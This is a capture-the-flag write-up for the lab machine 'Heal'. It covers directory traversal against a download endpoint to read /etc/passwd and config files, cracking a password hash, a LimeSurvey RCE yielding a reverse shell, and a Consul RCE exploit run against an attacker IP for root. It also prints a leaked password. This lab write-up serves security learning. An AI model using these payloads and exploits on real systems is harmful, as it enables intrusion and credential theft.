 ## Step 1. Scanning 
 ``nmap -sC -sV --min-rate 3500 10.10.11.46``<br>
Port 22 and 80 are open
We also got the name of thhe domain.

## Step 2. Registering the domain to hosts
``echo "10.10.11.46 heal.htb/" | sudo tee -a /etc/hosts``

## Step 3. subdomain and directory search
- Used gobuster for this
- Found api.heal.htb which contained rubyonrails 
- Under this we got /robots.txt
- Under parent we got /robots.txt

- After signing up through heal.htb/ we come across a resume builder portal
- Exploring through endpoints we get another subdomain take-survey.heal.htb
- Adding that to /etc/hosts 
- We get a survey portal 
- for take-survey.heal.htb/index.php we get an admin email ralph@heal.htb

- There is a vulnerability in "Export as PDF" part of the resume uploaader
- Use burpsuite to intercept the request we get ``/download?filename=...``
- Chnage method to GET and use directory traversal 
- Also make sure to save Authorization token and place in the request
-`` GET /download?filename=/../../../../etc/passwd`` we get the file and see users ralph and ron using /bin/bash shell
- Similarly use ``../../config/database.yml`` to get database contents
- We can see the password for user in hash format use john the ripper to crack the password 

- Again use dirsearch command to search through http://take-survey.heal.htb/index.php/ ``dirsearch -u "http://take-survey.heal.htb/index.php/" -i 200 ``
- We can see different directories which have 200 status code
- Going through ``http://take-survey.heal.htb/index.php/admin/`` we come across a login portal
- Using the password and the username we got previously which we were unable to ssh to we get into a limesurvey portal

- Searching for limesurvey vulnerabilities i came across limesurvey rce vulnerability 
> https://github.com/Y1LD1R1M-1337/Limesurvey-RCE

- Following the steps i was able to get a reverse shell on the port
- and using python to get bash shell ``python3 -c "import pty;pty.spawn('/bin/bash')"``
- I came across the root directory
- exploring /var directory i came across ``/var/www/limesurvey/`` where there was a config file which had password AdmiDi0_pA$$w0rd
- Used the password to ssh login to user ralph but we could not but tried with user ron we were able to log in to
- We got user flag

- Inside the ron user use ``netstat -l`` to see if there are any activee listening ports
- We find different ports on localhost using localhost:8500
- ssh into that port using ``ssh -L 8500:127.0.0.1:8500 ron@heal.htb``
- Search for the localhost:8500 adress on the browser we come across a cluster overview ui
- Explorre aroound we find consul which has version 1.19.2
- Search for CVE for consul
- We find RCE for consul
- Download the exploit and save as pyhton file
- run the exploit ``python3 exploit.py 127.0.0.1 8500 10.10.14.25 6666 0 `` and listen on port 6666
- We are able to log in as root user
- ``cd ~`` to the root users directory where we can find root flag

